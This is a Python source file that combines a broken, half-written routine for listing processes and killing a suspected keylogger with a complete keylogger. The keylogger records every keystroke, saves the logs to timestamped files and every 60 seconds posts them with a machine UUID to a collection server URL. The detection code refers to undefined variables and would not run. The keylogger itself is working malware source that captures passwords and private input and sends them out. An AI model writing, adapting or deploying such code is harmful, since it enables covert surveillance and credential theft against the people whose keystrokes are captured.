#Imports
import keyboard
import requests
import uuid
import json
from threading import Timer
from datetime import datetime
from subprocess import Popen,PIPE
import os, signal
from sys import stdout
from re import split

#Request sending timer and remote server URL
SEND_TIMER = 60
URL = 'http://localhost:3000/submit'

#Keylogger-Detector class
class Detector:
    def __init__(self, proc):
        self.user = proc[0]
        self.pid = proc[1]
        self.cpu = proc[2]
        self.mem = proc[3]
        self.vsz = proc[4]
        self.rss = proc[5]
        self.tty = proc[6]
        self.stat = proc[7]
        self.start = proc[8]
        self.time = proc[9]
        self.cmd = proc[10]
    
    def name(self):
        return '%s' %self.cmd
    
    def pid(self):
        return '%s' %self.pid
    
#Process listing function
def get_proc_list():
    proc_list = []
    sub_proc = Popen(['ps', 'aux'], shell=False, stdout=PIPE)
    sub_proc.stdout.readline()
    for l in sub_proc.stdout:
        proc_info = split(" *", line.strip())
        proc_list.append(Detector(proc=proc_info))
    else:
        pass
    
    return proc_list

#Keylogger killing function
def kill_keylogger():
    r = input("\nDo you want to stop this process ? (y/n) ")
    if (r=='y' or r=="Y"):
        os.kill(int(key_pid), signal.SIGKILL)
    else:
        pass


#Keylogger class
class Keylogger:
    def __init__(self, interval, url):
        self.interval = interval
        self.report_method = "file"
        self.log = ""
        self.uuid = uuid.uuid1()
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        self.url = url

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # finally, add the key name to our global `self.log` variable
        self.log += name

    def update_filename(self):
        # construct the filename to be identified by start & end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
    
    def report_to_file(self):
        # open the file in write mode (create it)
        with open(f"{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            print(self.log, file=f)
            print(f"[+] Saved {self.filename}.txt")
    
    def send_request(self):
        with open(f"{self.filename}.txt", "r") as f:
            filedata = f.read()
            self.content = filedata.strip()

        reqdata = {'uuid': str(self.uuid), 'logs': str(self.content)} 

        r = requests.post(url=self.url, data=reqdata)
        print(r.text)

    def report(self):
        if self.log:
            # if there is something in log, report it
            self.end_dt = datetime.now()
            # update `self.filename`
            self.update_filename()
            if self.report_method == "file":
                self.report_to_file()
                self.send_request()
            # if you don't want to print in the console, comment below line
            print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
            
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # make a simple message
        print(f"{datetime.now()} - Started keylogger")
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()

if __name__ == "__main__":

    #Other keylogger detection
    proc_list = get_proc_list()
    proc_pid = []
    proc_cmd = []
    print("\nCheking Processes....\n")

    # detector = Detector(proc=proc_list)
    for p in proc_list:
        proc_cmd.append(detector.name)



    #Start this keylogger
    keylogger = Keylogger(interval=SEND_TIMER, url=URL)
    keylogger.start()

